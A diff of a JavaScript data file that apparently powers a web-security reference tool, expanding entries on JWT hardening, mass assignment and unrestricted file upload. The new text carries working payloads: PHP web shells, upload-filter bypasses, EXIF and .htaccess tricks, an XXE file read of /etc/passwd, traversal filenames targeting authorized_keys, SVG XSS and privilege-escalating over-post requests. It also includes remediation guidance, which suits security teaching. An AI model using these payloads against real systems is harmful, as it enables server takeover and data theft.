-              "Validate exp, aud, and iss on every request; keep token lifetimes short and support revocation for sensitive actions.",
-              "Do not trust key-location headers (jku/x5u) unless the URL is strictly allow-listed."
+              "Pin the expected algorithm server-side and reject any token whose alg does not match; explicitly reject 'none' in every case.",
+              "Never let the verification routine choose the algorithm/key from the token header — use an API that takes the algorithm and key as fixed parameters (this is the fix for algorithm confusion).",
+              "Use a long, high-entropy random HMAC secret (or properly managed asymmetric keys); never a dictionary word or a value committed to source; rotate on suspicion.",
+              "Validate all registered claims on every request — signature, exp, nbf, aud, and iss — and keep token lifetimes short with a refresh/revocation strategy for sensitive actions.",
+              "Do not trust key-location headers (jku, x5u) unless the URL is strictly allow-listed to your own domain, and resolve kid only against a fixed internal key set (never a file path or DB query built from it).",
+              "For logout/revocation needs, keep a server-side denylist or use short-lived tokens with refresh, since a pure stateless JWT cannot be revoked mid-lifetime."
             ]
           }
         ]
@@ -2139,23 +2250,54 @@ var VULNS = [
         severity: "High",
         ref: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
         description: "The app binds request fields straight to objects, letting attackers set properties they shouldn't control.",
-        brief: "Mass assignment (auto-binding, over-posting) happens when a framework maps incoming request parameters directly onto an internal object or model. If the binding is not restricted, an attacker adds fields the developer never intended to expose — isAdmin, role, balance, verified — and the framework dutifully sets them.\n\nImpact: privilege escalation, business-data tampering, and object-ownership takeover. It is common in modern API frameworks that make object binding effortless, and it turns an ordinary update endpoint into an escalation primitive.",
+        brief: "Mass assignment — also called auto-binding, over-posting, or (in the OWASP API Top 10) part of Broken Object Property Level Authorization — happens when a framework automatically maps the fields of an incoming request onto the properties of an internal object or database model. This binding is a convenience feature: instead of manually copying each field, the developer writes user.update(request.body) and the framework fills in everything that matches. The vulnerability is that 'everything that matches' includes properties the developer never intended a client to control.\n\nIf the model has sensitive attributes — isAdmin, role, groups, verified, balance, ownerId, id — and the binding is not restricted to a safe subset, an attacker simply adds those fields to the request. The framework dutifully sets them, turning an ordinary 'update my profile' endpoint into a privilege-escalation or data-tampering primitive. Because the read endpoint usually returns the full object, the attacker can learn exactly which fields exist and then over-post them on the next write.\n\nIt is especially common in frameworks that make binding effortless — Rails (before strong parameters), Spring MVC data binding, ASP.NET model binding, Laravel/Eloquent fillable, Django/DRF serializers with fields='__all__', and Node/Mongoose with unrestricted new Model(req.body). Impact: privilege escalation to admin, bypassing verification/approval gates, financial tampering, and reassigning object ownership.",
         quickReference: [
           { label: "Add a privileged field", cmd: "{\"username\":\"x\",\"email\":\"y\",\"isAdmin\":true}" },
           { label: "Escalate role on update", cmd: "PATCH /api/users/me  {\"role\":\"admin\"}" },
-          { label: "Tamper server-owned fields", cmd: "\"balance\":100000   \"verified\":true   \"id\":<other user>" },
-          { label: "Discover fields", cmd: "Read a GET response / JS to learn object properties, then set them on write" }
+          { label: "Tamper server-owned fields", cmd: "\"balance\":100000   \"verified\":true   \"ownerId\":<victim>" },
+          { label: "Discover fields", cmd: "GET the object / read JS to learn property names, then over-post them" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "The framework binds request keys to object properties by name, so any property that exists on the model is settable unless explicitly protected.",
+              "The mismatch is between what the UI form offers (a few fields) and what the model exposes (all of them) — the server enforces the form's field set nowhere, only the client does.",
+              "The read side leaks the target list: a GET that returns the full object hands the attacker every property name to try over-posting.",
+              "It overlaps with IDOR/broken access control (setting ownerId or id) and with business logic (setting balance/price), but the mechanism is specifically the auto-binder trusting extra fields.",
+              "Nested/relationship binding widens it: some frameworks bind related objects ({\"profile\":{\"role\":\"admin\"}}), reaching protected attributes indirectly."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Registration, profile update, and account-settings endpoints (set role/verified/isAdmin during create or update).",
+              "Any create/update API that accepts a JSON or form body mapping to a domain object (users, orders, teams, subscriptions).",
+              "Endpoints where the response object clearly has more fields than the form edits — the extra fields are the targets.",
+              "Multi-tenant apps: tenantId/orgId over-posting to cross tenants; ownerId/userId to reassign records.",
+              "Frameworks with a history of this: Rails, Spring, ASP.NET, Laravel Eloquent, Django REST Framework, Mongoose."
+            ]
+          },
+          {
+            title: "Step 1 — Enumerate the Object's Fields",
             type: "commands",
             commands: [
-              { label: "1. Enumerate the object's fields", cmd: "# a GET on the resource reveals every property name:\nGET /api/users/me\n# {\"id\":7,\"username\":\"x\",\"email\":\"y\",\"role\":\"user\",\"verified\":false, ...}\n# each server-owned field is a candidate to over-post" },
-              { label: "2. Over-post a privileged field on write", cmd: "# add fields the form never offered to a create/update:\nPATCH /api/users/me\n{\"email\":\"y\",\"role\":\"admin\"}          # escalate role\n{\"username\":\"x\",\"isAdmin\":true}       # privilege flag\n# accepted + persisted = mass assignment" },
-              { label: "3. Tamper business / ownership fields", cmd: "{\"balance\":100000}        # money\n{\"verified\":true}         # skip verification\n{\"userId\":<other-user>}   # reassign ownership of the object to a victim/you" },
-              { label: "4. Bind through nested relationships", cmd: "# some frameworks bind related objects too:\n{\"profile\":{\"user\":{\"roles\":[\"admin\"]}}}\n# reach privileged attributes via the object graph where direct fields are blocked" },
-              { label: "5. Confirm persistence", cmd: "# re-GET the object and verify the injected field stuck:\nGET /api/users/me   -> \"role\":\"admin\"\n# then use the new privilege" }
+              { label: "Read the full object", cmd: "GET /api/users/me\n# {\"id\":7,\"username\":\"x\",\"email\":\"y\",\"role\":\"user\",\"verified\":false,\"balance\":0,...}\n# every property here is a candidate to over-post on a write" },
+              { label: "Harvest names from other sources", cmd: "# admin API responses, JS bundles/models, API docs/Swagger, and error messages\n# often reveal fields the normal user object hides (isAdmin, permissions[])" },
+              { label: "Note naming conventions", cmd: "# guess siblings of known fields: is_admin/isAdmin/admin, role/roles/roleId,\n# verified/isVerified/emailVerified, active/enabled/status" }
+            ]
+          },
+          {
+            title: "Step 2 — Over-post & Confirm",
+            type: "commands",
+            commands: [
+              { label: "Escalate privilege on write", cmd: "PATCH /api/users/me\n{\"email\":\"y@corp\",\"role\":\"admin\"}\n{\"username\":\"x\",\"isAdmin\":true}\n{\"permissions\":[\"*\"],\"groups\":[\"admins\"]}\n# accepted and persisted = mass assignment" },
+              { label: "Bypass gates & tamper data", cmd: "{\"verified\":true}       # skip email/KYC verification\n{\"approved\":true}       # skip an approval workflow\n{\"balance\":1000000}     # financial tampering\n{\"price\":0}             # order manipulation" },
+              { label: "Reassign ownership / cross-tenant", cmd: "{\"ownerId\":<victim-id>}     # take over / plant a record\n{\"userId\":<other-user>}     # attach your action to someone else\n{\"tenantId\":<other-org>}    # cross tenant boundary\n{\"id\":<other-record>}       # overwrite a different object" },
+              { label: "Nested / relationship binding", cmd: "# where direct fields are protected, try the object graph:\n{\"profile\":{\"user\":{\"roles\":[\"admin\"]}}}\n{\"role_attributes\":{\"name\":\"admin\"}}" },
+              { label: "Confirm persistence", cmd: "GET /api/users/me   ->  \"role\":\"admin\"\n# then exercise the new privilege to prove impact" }
             ]
           },
           {
@@ -2163,22 +2305,23 @@ var VULNS = [
             type: "table",
             columns: ["Field", "Effect"],
             rows: [
-              ["role / isAdmin / groups", "Privilege escalation to administrator"],
-              ["verified / approved / active", "Bypass verification or approval gates"],
-              ["balance / price / credit", "Financial tampering"],
-              ["userId / ownerId", "Reassign object ownership"],
-              ["id", "Overwrite a different record"]
+              ["role / isAdmin / groups / permissions", "Privilege escalation to administrator"],
+              ["verified / approved / active / status", "Bypass verification or approval gates"],
+              ["balance / price / credit / discount", "Financial tampering"],
+              ["ownerId / userId / tenantId", "Reassign ownership / cross a tenant boundary"],
+              ["id / uuid", "Overwrite or collide with a different record"],
+              ["emailVerified / mfaEnabled", "Weaken account-security state"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
               ["1", "GET the object to learn its fields", "List of server-owned properties"],
-              ["2", "Over-post a privileged field on write", "Server binds it blindly"],
-              ["3", "Re-GET to confirm persistence", "Field is set"],
-              ["4", "Use the new state (role/ownership)", "Escalation / takeover"]
+              ["2", "Over-post a privileged field on create/update", "Server binds it blindly"],
+              ["3", "Re-GET to confirm persistence", "Field is set on the record"],
+              ["4", "Use the new state (role / ownership / balance)", "Privilege escalation, takeover, or fraud"]
             ]
           },
           {
@@ -2186,9 +2329,10 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite", "Add fields to requests and confirm binding"],
-              ["Postman / curl", "Craft JSON bodies with extra properties"],
-              ["JS source review", "Discover model field names to target"]
+              ["Burp Suite (Repeater)", "Add extra fields to requests and confirm binding/persistence"],
+              ["Postman / curl", "Craft JSON/form bodies with additional properties"],
+              ["Param Miner (Burp)", "Discover hidden/accepted parameter names"],
+              ["Swagger/OpenAPI & JS review", "Enumerate model field names to target"]
             ]
           },
           {
@@ -2196,18 +2340,20 @@ var VULNS = [
             type: "references",
             items: [
               { label: "OWASP — Mass Assignment Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html" },
-              { label: "OWASP API Security — Broken Object Property Level Authorization", url: "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" }
+              { label: "OWASP API Security — Broken Object Property Level Authorization (API3:2023)", url: "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" },
+              { label: "PayloadsAllTheThings — Mass Assignment", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Bind to an explicit allow-list of fields (a DTO / view model), never directly to the database entity.",
-              "Use the framework's field-whitelisting (strong params, @JsonIgnore, ignore/exclude lists) and default to deny.",
-              "Set sensitive fields (role, owner, price) only in server-side code paths, never from request binding.",
-              "Separate read models from write models so response shape does not dictate what is writable.",
-              "Add tests that attempt to over-post privileged fields and assert they are ignored."
+              "Bind requests to an explicit allow-list DTO / view model that contains ONLY the fields a client may set — never bind directly to the database entity.",
+              "Use the framework's field-whitelisting: Rails strong parameters (permit), Spring @InitBinder/setAllowedFields or a dedicated DTO, ASP.NET [Bind]/BindNever, Laravel $fillable (not $guarded blanket), Django/DRF explicit serializer fields (never fields='__all__'), Mongoose explicit field assignment.",
+              "Set sensitive fields (role, owner, tenant, price, verified) only in server-side code after an authorization check — never from request binding.",
+              "Separate read models from write models so the shape of the response never dictates what is writable.",
+              "Default to deny: new model properties should be non-bindable unless explicitly added to the allow-list.",
+              "Add automated tests that attempt to over-post privileged fields (isAdmin, role, ownerId) and assert the server ignores them."
             ]
           }
         ]
@@ -2624,46 +2770,88 @@ var VULNS = [
         severity: "High",
         ref: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
         description: "Weak upload validation lets an attacker place executable or malicious files on the server.",
-        brief: "File upload becomes dangerous when the application does not properly restrict what can be uploaded and where it lands. If an attacker can upload a server-executable file (a web shell) into a web-accessible, executable directory, the result is remote code execution. Even without execution, weak handling enables stored XSS (SVG/HTML), path traversal, and denial of service.\n\nImpact: RCE via web shell, stored XSS, and file overwrite. The common failures are trusting the client-supplied filename or Content-Type, checking only the extension, and storing uploads under the web root where they can be requested and run.",
+        brief: "An unrestricted file upload exists when an application accepts a file without adequately constraining its type, contents, name, and — critically — where it is stored and whether that location executes code. The headline impact is remote code execution: if an attacker can place a server-executable file (a web shell such as a .php, .jsp, or .aspx) into a directory the web server will execute, requesting that file runs their code with the web process's privileges.\n\nBut RCE is only the top of the ladder. Even when execution is prevented, weak upload handling yields: stored XSS (an SVG or HTML file served inline runs script in the app's origin); path/write traversal (a filename containing ../ overwrites files outside the intended directory, e.g. replacing index.php or another user's file); XXE (an SVG/DOCX parsed server-side); SSRF and image-library RCE (ImageTragick/ghostscript on a crafted image); denial of service (huge files, decompression bombs); and client-side malware distribution from a trusted domain.\n\nThe recurring failures are trusting the client-supplied filename or Content-Type, validating only the extension (or only with a blacklist), checking magic bytes but still executing the file, and — most importantly — storing uploads under the web root in an executable path with a predictable name. A robust design has to get several of these right at once.",
         quickReference: [
           { label: "Web shell (PHP)", cmd: "shell.php  ->  <?php system($_GET['c']); ?>" },
-          { label: "Extension bypasses", cmd: "shell.php.jpg   shell.pHp   shell.phtml   shell.php%00.jpg   double extension" },
-          { label: "Content-Type / magic-byte spoof", cmd: "Send image/png with GIF89a header + PHP payload" },
-          { label: "Non-RCE impact", cmd: "malicious.svg (stored XSS), ../../ in filename (path traversal)" }
+          { label: "Extension bypasses", cmd: "shell.php.jpg   shell.pHp   .phtml/.php5/.phar   shell.php%00.jpg   trailing dot/space" },
+          { label: "Content-Type / magic-byte spoof", cmd: "Content-Type: image/png + GIF89a header prepended to PHP" },
+          { label: "Non-RCE impact", cmd: "malicious.svg (stored XSS/XXE), ../ in filename (overwrite)" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. Upload a benign file and locate it", cmd: "# upload test.jpg, then find where it is served:\nGET /uploads/test.jpg\n# is the path predictable and web-accessible? does the dir execute scripts?" },
-              { label: "2. Try a web shell straight up", cmd: "# shell.php:\n<?php system($_GET['c']); ?>\n# if accepted and executable:\nGET /uploads/shell.php?c=id   -> command output = RCE" },
-              { label: "3. Bypass extension / type filters", cmd: "shell.php.jpg        # double extension\nshell.phtml / .php5  # alternate exec extensions\nshell.pHp            # case\nContent-Type: image/png   # forged MIME with a PHP body\nGIF89a;<?php system($_GET['c']);?>   # magic-byte polyglot" },
-              { label: "4. Enable execution via config upload", cmd: "# where scripts don't run, upload a handler config to turn them on:\n# Apache:  .htaccess  ->  AddType application/x-httpd-php .jpg\n# IIS:     web.config with a handler mapping\n# then upload the payload with the now-executable extension" },
-              { label: "5. Non-RCE impact when exec is impossible", cmd: "# stored XSS via an inline-served SVG/HTML:\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n# path traversal in the filename to overwrite outside the dir:\nfilename=\"../../var/www/html/index.php\"" }
+            title: "Root Cause & What Makes It Dangerous",
+            type: "notes",
+            items: [
+              "Two things must both go wrong for RCE: the app accepts a file it should reject, AND that file lands somewhere the server will execute (web root + handler for its extension).",
+              "Client-supplied metadata is untrustworthy: the filename, extension, and Content-Type are all set by the attacker in the multipart request and mean nothing on their own.",
+              "Extension checks fail in many ways: blacklists miss variants (.phtml, .php5, .phar, .pht, .asp;.jpg), allow-lists can be defeated by double extensions or parser quirks, and case/encoding tricks slip past naive matching.",
+              "Magic-byte / image validation alone is insufficient — a valid image can carry a payload (polyglot) and still be interpreted as script if the extension/handler allows execution.",
+              "Even non-executable uploads are dangerous: inline-served SVG/HTML = stored XSS; server-side parsing of SVG/Office = XXE; attacker-controlled filename = write traversal / overwrite."
             ]
           },
           {
-            title: "Validation Bypasses",
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Obvious uploads: profile/avatar images, document and attachment uploads, import features, resume/CV, bulk CSV/XML import, and 'attach a file' in support/ticketing.",
+              "Less obvious: rich-text editors with image paste/upload, API endpoints that accept base64 file blobs, and signature/logo uploads in settings.",
+              "After upload, always find WHERE the file is served (predictable path? under web root?) and WHETHER that directory executes scripts — that determines RCE vs XSS-only.",
+              "Filename handling: does the app keep your filename? Then test ../ traversal and null bytes.",
+              "Server-side processing: thumbnailing, PDF/preview generation, virus scanning, and format conversion are sinks for image-library RCE and XXE."
+            ]
+          },
+          {
+            title: "Step 1 — Baseline & Straight Shot",
+            type: "commands",
+            commands: [
+              { label: "Upload a benign file and locate it", cmd: "# upload test.jpg, then find where it is served and how it's named:\nGET /uploads/test.jpg\n# note: predictable path? web-accessible? random filename? does the dir run scripts?" },
+              { label: "Try a web shell directly", cmd: "# shell.php\n<?php system($_GET['c']); ?>\n# if accepted and the dir executes PHP:\nGET /uploads/shell.php?c=id   ->  uid=... = RCE\n# per stack: shell.jsp, shell.aspx, shell.phtml" },
+              { label: "Test what the server actually checks", cmd: "# upload shell.php, then shell.jpg with PHP inside, then shell.php with a fake\n# image header — observe which are rejected to learn the filter (ext? MIME? bytes?)" }
+            ]
+          },
+          {
+            title: "Step 2 — Filter Bypasses",
+            type: "commands",
+            commands: [
+              { label: "Extension tricks", cmd: "shell.php.jpg              # double extension (Apache mis-config picks .php)\nshell.phtml  shell.php5  shell.pht  shell.phar   # alternate executable exts\nshell.pHp                  # case (case-insensitive filesystems/handlers)\nshell.php%00.jpg           # null byte (old stacks)\nshell.php.                 # trailing dot / space (Windows strips it)\nshell.php;.jpg             # semicolon (old IIS)" },
+              { label: "Content-Type & magic bytes", cmd: "# forge the multipart Content-Type header:\nContent-Type: image/png\n# prepend a real image signature so magic-byte checks pass:\nGIF89a;\n<?php system($_GET['c']); ?>\n# or inject PHP into EXIF: exiftool -Comment='<?php system($_GET[c]);?>' img.jpg" },
+              { label: "Enable execution via config upload", cmd: "# where the dir won't run scripts, upload a config to turn it on:\n# Apache .htaccess:\nAddType application/x-httpd-php .jpg\n# IIS web.config with a handler mapping\n# then upload payload.jpg and request it" },
+              { label: "Content/length & double-request tricks", cmd: "# race the AV/validation: request the file in the window before it's deleted\n# split validation: some apps validate one request but store another\n# overlong filenames / unicode to truncate past the checked extension" }
+            ]
+          },
+          {
+            title: "Step 3 — Impact Without RCE",
+            type: "commands",
+            commands: [
+              { label: "Stored XSS via SVG/HTML", cmd: "# uploaded and served inline (image/svg+xml):\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n# fires in the app's origin whenever the image is viewed" },
+              { label: "XXE via SVG/Office", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE svg [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>\n<svg><text>&x;</text></svg>\n# if the server rasterises the SVG, the file leaks (see XXE)" },
+              { label: "Write traversal / overwrite", cmd: "filename=\"../../../var/www/html/index.php\"\nfilename=\"../../.ssh/authorized_keys\"\n# overwrite served or config files if the filename is trusted" },
+              { label: "Image-library RCE & DoS", cmd: "# ImageTragick (CVE-2016-3714) via a crafted MVG/SVG passed to ImageMagick\n# decompression bomb (huge PNG/zip) or pixel-flood image -> memory DoS" }
+            ]
+          },
+          {
+            title: "Validation Bypass Reference",
             type: "table",
             columns: ["Check", "Bypass"],
             rows: [
-              ["Extension allow-list", "Alternate exec extensions (.phtml, .php5, .asp;.jpg), case tricks, double extensions"],
-              ["Client Content-Type", "Trivially forged in the request"],
-              ["Magic-byte check only", "Prepend a valid image header, append the payload (polyglot)"],
-              ["Blacklist of extensions", "Miss one variant, or rely on .htaccess/web.config upload to enable execution"],
-              ["Filename trust", "../ path traversal to write outside the intended directory"]
+              ["Extension allow-list", "Alternate exec exts (.phtml/.php5/.phar), double extension, case, parser quirks"],
+              ["Extension blacklist", "One missed variant, or upload .htaccess/web.config to enable execution"],
+              ["Client Content-Type", "Trivially forged in the multipart request"],
+              ["Magic-byte check only", "Prepend a valid image header, append/EXIF the payload (polyglot)"],
+              ["Filename trust", "../ write traversal to overwrite files outside the directory"],
+              ["Validate-then-store gap", "Race the file in the window before deletion; TOCTOU"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Upload a benign file, find its URL", "Storage path + exec behaviour"],
-              ["2", "Bypass validation with a web shell", "Server-side script stored"],
+              ["1", "Upload a benign file, find its URL & exec behaviour", "Storage path + whether scripts run"],
+              ["2", "Bypass validation with a web shell", "Server-side script stored in an exec path"],
               ["3", "Request the shell URL", "RCE as the web user"],
-              ["4", "Or serve SVG/HTML inline", "Stored XSS fallback"]
+              ["4", "If exec blocked: SVG/HTML inline", "Stored XSS in the app origin"],
+              ["5", "Reverse shell / read secrets", "Host compromise and pivot"]
             ]
           },
           {
@@ -2671,9 +2859,10 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite", "Manipulate filename, Content-Type, and magic bytes"],
+              ["Burp Suite", "Manipulate filename, Content-Type, and magic bytes in the multipart request"],
               ["fuxploider", "Automated upload-filter fuzzing and bypass discovery"],
-              ["weevely", "Generate stealthy PHP web shells"],
+              ["UploadScanner (Burp)", "Automated battery of malicious upload variants"],
+              ["weevely", "Generate stealthy, obfuscated PHP web shells"],
               ["exiftool", "Embed payloads into image metadata for polyglots"]
             ]
           },
@@ -2681,19 +2870,22 @@ var VULNS = [
             title: "References",
             type: "references",
             items: [
+              { label: "OWASP — File Upload Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" },
               { label: "OWASP — Unrestricted File Upload", url: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" },
-              { label: "OWASP — File Upload Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" }
+              { label: "PortSwigger — File upload vulnerabilities (with labs)", url: "https://portswigger.net/web-security/file-upload" },
+              { label: "PayloadsAllTheThings — Upload Insecure Files", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Store uploads outside the web root, or in storage that cannot execute code, and serve them via a handler — never let the upload directory run scripts.",
-              "Validate with a strict allow-list of extensions AND verified content type; generate a random server-side filename and set the extension yourself.",
-              "Serve downloads with Content-Disposition: attachment and a correct Content-Type; force SVG/HTML to download rather than render.",
-              "Enforce size limits and scan for malware; re-encode images to strip embedded payloads.",
-              "Never use the client-supplied filename for the stored path; strip directory components entirely."
+              "Store uploads outside the web root (or in object storage / a dedicated non-executable origin) and serve them through a controlled handler — never let the upload directory execute scripts.",
+              "Validate with a strict allow-list of permitted extensions AND verified content type / magic bytes, and reject anything else; do not rely on a blacklist.",
+              "Generate a new random server-side filename and set the extension yourself; strip all directory components from the client filename so it can never influence the storage path.",
+              "For images, re-encode/transcode them server-side (which strips embedded payloads and EXIF), and process with patched libraries configured to ignore embedded scripts/XML.",
+              "Serve downloads with Content-Disposition: attachment, X-Content-Type-Options: nosniff, and a correct Content-Type so SVG/HTML cannot render inline in the app origin.",
+              "Enforce size limits and guard against decompression bombs; run AV/malware scanning; and disable dangerous handlers (.htaccess override, PHP execution) in upload paths."
             ]
           }
         ]
